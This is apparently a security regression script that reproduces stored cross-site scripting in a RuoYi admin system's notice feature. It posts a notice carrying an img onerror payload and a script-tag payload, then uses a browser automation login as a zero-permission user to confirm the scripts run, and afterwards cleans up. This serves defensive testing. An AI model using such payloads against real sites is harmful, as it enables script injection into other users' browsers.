#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A21 复现：公告富文本原样入库+v-html 渲染→持 notice:add 者注入脚本在零权限受害者浏览器执行。
双腿：API（原文入库+原文回传）+ UI（零权限受害者铃铛预览，window 标记实证执行）。用后清理。"""
import json
import os
import sys
import time

sys.path.insert(0, "/home/irons/dev/ruoyi-regression")
sys.path.insert(0, "/home/irons/dev/ruoyi-regression/exec")
import api  # noqa: E402
from contract_lib import (DEFAULT_PW, ensure_role, delete_role, ensure_user,  # noqa: E402
                          delete_user, user_token, uniq)
from playwright.sync_api import sync_playwright  # noqa: E402

OUT = os.environ.get("TCMS_ARTIFACT_DIR", os.path.dirname(os.path.abspath(__file__)))
TITLE = uniq("notice_a21")
PAYLOAD = ('<p>常规富文本</p><img src=x onerror="window.__a21xss=\'pwned\'">'
           '<script>window.__a21xss2=\'pwned2\'</script>')


def shot(pg, name):
    pg.screenshot(path=os.path.join(OUT, name), full_page=True)


def main():
    ev = {"ts": time.strftime("%Y-%m-%dT%H:%M:%S")}
    tok = api.admin_token()

    # ---- seed：admin 发含载荷公告 ----
    _, r = api.post("/system/notice", token=tok, body={
        "noticeTitle": TITLE, "noticeContent": PAYLOAD, "noticeType": "1", "status": "0"})
    assert r.get("code") == 200, r
    row = api.one("SELECT notice_id, notice_content FROM sys_notice WHERE notice_title=%s", (TITLE,))
    nid = row["notice_id"]
    raw = row["notice_content"]
    raw = raw.decode("utf-8", "replace") if isinstance(raw, (bytes, bytearray)) else raw
    ev["seed"] = {"notice_id": nid, "title": TITLE,
                  "db_raw_has_script": "<script" in raw.lower(),
                  "db_raw_has_onerror": "onerror" in raw.lower()}
    _, d = api.get("/system/notice/%s" % nid, token=tok)
    c = (d.get("data") or {}).get("noticeContent") or ""
    if isinstance(c, bytes):
        c = c.decode("utf-8", "replace")
    ev["api"] = {"detail_readback_has_script": "<script" in c.lower(),
                 "detail_readback_has_onerror": "onerror" in c.lower()}

    # ---- victim：零权限用户 ----
    rid, _ = ensure_role("a21vic")
    uid, uname = ensure_user("a21vicu", role_ids=[rid])
    ltok = user_token(uname)
    _, gi = api.get("/getInfo", token=ltok)
    _, lt = api.get("/system/notice/listTop", token=ltok)
    ev["victim"] = {"user": uname, "permissions": gi.get("permissions"),
                    "listTop_sees_notice": any(t["noticeId"] == nid for t in (lt.get("data") or []))}

    with sync_playwright() as pw:
        b = pw.chromium.launch(headless=True)
        pg = b.new_context(viewport={"width": 1440, "height": 900}).new_page()
        pg.set_default_timeout(15000)
        with pg.expect_response(lambda x: "/captchaImage" in x.url) as cap:
            pg.goto("http://localhost:18091/login", wait_until="domcontentloaded")
        pg.wait_for_selector('input[placeholder="账号"]')
        uuid = cap.value.json().get("uuid")
        ans = api.redis_get("captcha_codes:" + uuid)
        pg.fill('input[placeholder="账号"]', uname)
        pg.fill('input[placeholder="密码"]', DEFAULT_PW)
        pg.fill('input[placeholder="验证码"]', ans)
        pg.locator("button", has_text="登 录").first.click()
        pg.wait_for_url("**/index**", timeout=20000)
        pg.wait_for_timeout(2500)
        box = pg.locator(".el-overlay-message-box")
        if box.count():
            box.get_by_role("button", name="取消").click()
            pg.wait_for_timeout(800)
        pg.locator(".notice-trigger").hover()
        pg.wait_for_timeout(1500)
        shot(pg, "A21_01_victim_bell_popup.png")
        pg.locator(".notice-item-title", has_text=TITLE).first.click()
        pg.wait_for_timeout(2500)
        ev["victim"]["browser_exec_onerror"] = pg.evaluate("window.__a21xss")
        ev["victim"]["browser_exec_script_tag"] = pg.evaluate("window.__a21xss2")
        shot(pg, "A21_02_victim_preview.png")
        b.close()

    # ---- cleanup ----
    api.delete("/system/notice/%s" % nid, token=tok)
    delete_user(uid)
    delete_role(rid)
    ev["cleanup"] = {
        "notice_remaining": len(api.db(
            "SELECT 1 FROM sys_notice WHERE notice_title=%s", (TITLE,))),
        "user_remaining": len(api.db(
            "SELECT 1 FROM sys_user WHERE user_id=%s AND del_flag='0'", (uid,))),
        "role_remaining": len(api.db(
            "SELECT 1 FROM sys_role WHERE role_id=%s AND del_flag='0'", (rid,)))}

    with open(os.path.join(OUT, "a21_evidence.json"), "w", encoding="utf-8") as f:
        json.dump(ev, f, ensure_ascii=False, indent=1)
    print(json.dumps(ev, ensure_ascii=False, indent=1))


if __name__ == "__main__":
    main()
